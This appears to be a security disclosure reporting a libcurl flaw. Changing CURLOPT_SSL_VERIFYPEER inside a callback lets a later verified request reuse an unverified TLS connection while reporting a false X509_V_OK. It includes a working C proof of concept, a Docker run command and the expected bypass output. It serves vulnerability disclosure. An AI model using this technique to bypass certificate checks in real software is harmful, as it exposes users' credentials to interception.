## Summary:

`Curl_ssl_conn_config_update` overwrites `conn->ssl_config.verifypeer` when `curl_easy_setopt(CURLOPT_SSL_VERIFYPEER, ...)` is called, with no handshake-state guard — only `if(data->conn)`. Since `setopt` is documented as callable from callbacks (`setopt.c:2930`), an application can connect with `verifypeer=0` (accepting a rogue cert), then flip to `verifypeer=1` inside a write callback. The mutation rewrites the pooled connection's `ssl_config.verifypeer` from 0 to 1, so a subsequent `verifypeer=1` request reuses the unverified TLS connection via `match_ssl_primary_config` (sees `1==1`) without a new handshake. The application reads `CURLINFO_SSL_VERIFYRESULT=0` (`X509_V_OK`, calloc default — never updated on reuse) and believes verification passed. A MITM with a rogue-signed cert captures the 2nd request's credentials.

## Affected version

```
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV OpenSSL/3.5.6 zlib/1.3.1
```

Bug is in shared `lib/vtls/vtls_config.c:406-423`, not backend-specific. Reproduced on current master commit `cfc7922377`.

## Steps To Reproduce:

```c
#include <curl/curl.h>
#include <stdio.h>

static CURL *g;
static int up;

static size_t cb(char *p, size_t s, size_t n, void *u) {
    if(!up++) curl_easy_setopt(g, CURLOPT_SSL_VERIFYPEER, 1L);
    return s * n;
}

int main(void) {
    curl_global_init(0);
    CURLSH *sh = curl_share_init();
    curl_share_setopt(sh, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);

    /* 1st: verifypeer=0, accept rogue cert, upgrade to 1 in callback */
    CURL *a = curl_easy_init();
    g = a;
    curl_easy_setopt(a, CURLOPT_URL, "https://127.0.0.1:9443/1");
    curl_easy_setopt(a, CURLOPT_CAINFO, "real_ca.crt");
    curl_easy_setopt(a, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(a, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(a, CURLOPT_WRITEFUNCTION, cb);
    curl_easy_setopt(a, CURLOPT_SHARE, sh);
    curl_easy_setopt(a, CURLOPT_NOSIGNAL, 1L);
    curl_easy_perform(a);
    curl_easy_cleanup(a);

    /* 2nd: verifypeer=1, should reject but reuses a's unverified conn */
    CURL *b = curl_easy_init();
    curl_easy_setopt(b, CURLOPT_URL, "https://127.0.0.1:9443/2");
    curl_easy_setopt(b, CURLOPT_CAINFO, "real_ca.crt");
    curl_easy_setopt(b, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(b, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(b, CURLOPT_SHARE, sh);
    curl_easy_setopt(b, CURLOPT_NOSIGNAL, 1L);
    CURLcode rc = curl_easy_perform(b);

    long vr = -1, nc = -1;
    curl_easy_getinfo(b, CURLINFO_SSL_VERIFYRESULT, &vr);
    curl_easy_getinfo(b, CURLINFO_NUM_CONNECTS, &nc);
    printf("result=%d verify=%ld connects=%ld %s\n", rc, vr, nc,
           (rc == 0 && nc == 0 && vr == 0) ? "BYPASS" : "no-bypass");

    curl_easy_cleanup(b);
    curl_share_cleanup(sh);
    curl_global_cleanup();
    return 0;
}
```

Self-contained Docker reproduction:

```bash
docker build -t f5-setopt .
docker run --rm f5-setopt
```

Expected output:

```
result=0 verify=0 connects=0 BYPASS
```

- `result=0` — 2nd request succeeded over rogue-signed TLS
- `verify=0` — false `X509_V_OK` (calloc default, never updated on reuse)
- `connects=0` — connection reused, no new handshake

The 0→1 upgrade is the only exploitable direction. Session cache is unaffected (`ssl_peer_key_add_vrfy` encodes `:NO-VRFY-PEER` at handshake time). `CURLOPT_SSL_VERIFYHOST` and `CURLOPT_SSL_VERIFYSTATUS` have the same bug (same `Curl_ssl_conn_config_update` call, same missing guard).

## Impact

## Summary:

A `verifypeer=1` request silently reuses a TLS connection that was established without certificate chain verification. The application cannot detect this — `CURLINFO_SSL_VERIFYRESULT` returns `X509_V_OK` (calloc default, never updated on connection reuse), so it believes verification passed. If the reused connection was established to an attacker-controlled server (with `verifypeer=0`), subsequent requests' credentials and cookies flow over that connection while the application believes TLS is strictly verified.
